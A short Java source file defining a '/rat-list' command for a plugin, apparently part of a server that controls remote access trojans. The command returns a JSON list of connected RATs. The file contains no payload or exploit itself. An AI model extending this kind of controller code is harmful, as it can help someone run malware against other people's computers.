package me.wpkg.ratplugin.commands;

import com.fasterxml.jackson.core.JsonProcessingException;
import me.wpkg.ratplugin.utils.ClientUtils;
import me.wpkg.ratplugin.RatPlugin;
import com.serverd.client.Client;
import com.serverd.plugin.Plugin;
import com.serverd.plugin.command.Command;

import java.io.IOException;

import static me.wpkg.ratplugin.ErrorCodes.*;

public class ListRats extends Command
{
    public ListRats()
    {
        command = "/rat-list";
        help = "/rat-list - Sending RAT's list in JSON";
    }
    @Override
    public void execute(String[] strings, Client client, Plugin plugin) throws IOException
    {
        RatPlugin instance = (RatPlugin) plugin.getInstance();

        try
        {
            client.send(ok(ClientUtils.ratsListJson(instance)));
        }
        catch (JsonProcessingException e)
        {
            plugin.error("Error parsing json: " + e.getMessage());
            client.send(error(e.getMessage()));
        }
    }
}
